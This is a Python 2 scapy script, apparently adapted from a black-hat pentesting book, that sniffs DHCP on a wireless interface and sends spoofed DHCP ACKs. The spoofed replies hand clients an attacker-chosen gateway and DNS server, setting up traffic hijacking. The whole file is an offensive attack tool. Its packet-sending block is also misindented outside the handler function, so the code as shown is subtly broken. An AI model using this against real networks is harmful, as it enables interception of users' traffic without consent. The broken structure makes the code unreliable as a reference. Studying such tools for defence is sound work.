#!/usr/bin/env python

########################################################################
#created by br0k3ngl255;
#			According to Justin Seitz book - pyhton for black hat pentersters
########################################################################

#Libs *******************************************************************

import sys
import getopt
import random
import scapy.all as scapy

#Vars +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

dev = "wlan0"
gateway = None
nameserver = None
dhcpserver = None
client_net = "10.0.0."
fltr = "udp port 67"
dhcp_message_type=None

#Funcs /\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
def handle_pkt(pkt):
	eth = pkt.getlayer(scapy.Ether)
	ip = pkt.getlayer(scapy.IP)
	udp = pkt.getlayer(scapy.UDP)
	bootp = pkt.getlayer(scapy.BOOTP)
	dhcp = pkt.getlayer(scapy.DHCP)
	dhcp_message_type = None

	if not dhcp:
		return False
		
	for opt in dhcp.options:
		if opt[0] == "message-type":
			dhcp_message_type = opt[1]


if dhcp_message_type == 3:
    client_ip = client_net + str(random.randint(2,254))
    dhcp_ack = scapy.Ether(src=eth.dst, dst=eth.src) / \
               scapy.IP(src=dhcpserver, dst=client_ip) / \
               scapy.UDP(sport=udp.dport,dport=udp.sport) / \
               scapy.BOOTP(op=2,chaddr=eth.dst, siaddr=gateway, yiaddr=client_ip, xid=bootp.xid) / \
               scapy.DHCP(options=[('message-type', 5),('requested_addr', client_ip),('subnet_mask', '255.255.255.0'),('router', gateway),('name_server', nameserver),('end')]) 
               
    print "Send spoofed DHCP ACK to %s" % ip.src
    scapy.sendp(dhcp_ack, iface=dev)


def usage():
	print sys.argv[0] + """
	-d <dns_ip>
	-g <gateway_ip>
	-i <dev>
	-s <dhcp_ip>
	"""
	sys.exit(1)
	
try:
	cmd_opts = "d:g:i:s:"
	opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
		usage()
		
for opt in opts:
	if opt[0] == "-i":
		dev = opt[1]
	elif opt[0] == "-g":
		gateway = opt[1]
	elif opt[0] == "-d":
		nameserver = opt[1]
	elif opt[0] == "-s":
		dhcpserver = opt[1]
	else:
		usage()
					
					
if not gateway:
	gateway = scapy.get_if_addr(dev)
				
				
if not nameserver:
	nameserver = gateway
			
			
if not dhcpserver:
	dhcpserver = gateway


###
#Main - _ - _ - _ - _ - _ - _ - _ - _ - _ - _ - _ - _ - _ - _ - _ - _ - _ 
###
print "Hijacking DHCP requests on %s" % (dev)
scapy.sniff(iface=dev, filter=fltr, prn=handle_pkt)
	
